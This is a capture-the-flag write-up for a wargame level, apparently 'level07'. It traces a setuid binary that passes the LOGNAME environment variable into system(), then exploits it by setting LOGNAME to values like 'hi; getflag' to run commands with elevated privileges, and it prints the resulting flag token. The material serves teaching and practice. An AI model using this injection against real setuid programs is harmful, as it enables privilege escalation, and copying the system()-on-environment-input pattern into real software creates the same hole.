## Phase 1: Reconnaissance

We begin by listing the files in the home directory and identifying anything unusual

- A binary named `level07` is present

We inspect it using the `file` command:

```bash
file level07
```

Output:

```console
level07: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked
```

This confirms that we are dealing with a binary file

We now use `ltrace` to observe library calls made by the binary:

```bash
ltrace ./level07
```

Output:

```txt
setresgid(2007, 2007, 2007) = 0
setresuid(2007, 2007, 2007) = 0
getenv("LOGNAME")           = "level07"
asprintf(...)               = 18
```

From this, we immediately notice:
- The binary calls `getenv("LOGNAME")`
- Based on this, its obvious it has to do something with `getenv` and `asprintf`

---

## Phase 3: Static Analysis

To better understand the logic, the binary is extracted locally and decompiled using **dogbolt.org**

The simplified `main` function looks like this:

```c
int main(...)
{
    char *buffer;
    char *envValue;

    envValue = getenv("LOGNAME");
    asprintf(&buffer, "/bin/echo %s ", envValue);
    system(buffer);
}
```

Program logic:
- Read the `LOGNAME` environment variable
- Build a command string using `asprintf` + `LOGNAME`
- Execute the entire command using `system()` 

Example behavior:

- if `$LOGNAME` = alex
  -   `asprintf()` stores in `buffer` -> "/bin/echo alex "
  -   `system()`   runs -> "/bin/echo alex " 

---

## Phase 4: Vulnerability Analysis

- Because `LOGNAME` can be FULLY controlled and passed directly into `system()`, the command is vulnerable to **command injection**

This line:

```c
system("/bin/echo <LOGNAME>");
```

Is equivalent to running the following in a shell:

```sh
/bin/echo <LOGNAME>
```

Which means shell delimiters (such as `;`) will be interpreted...

---

## Phase 5: Exploitation

We first confirm control over `LOGNAME`:

```bash
export LOGNAME="hi"
./level07
```

Output:

```
hi
```

Now we inject a second command using `;`

```bash
export LOGNAME="hi; whoami"
./level07
```

Output:

```
hi
flag07
```

This confirms that the command is executed with **flag07 privileges**

---

## Phase 6: Getting the Flag

Now we use the same technique to execute `getflag`:

```bash
export LOGNAME="hi; getflag"
./level07
```

Output:

```txt
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
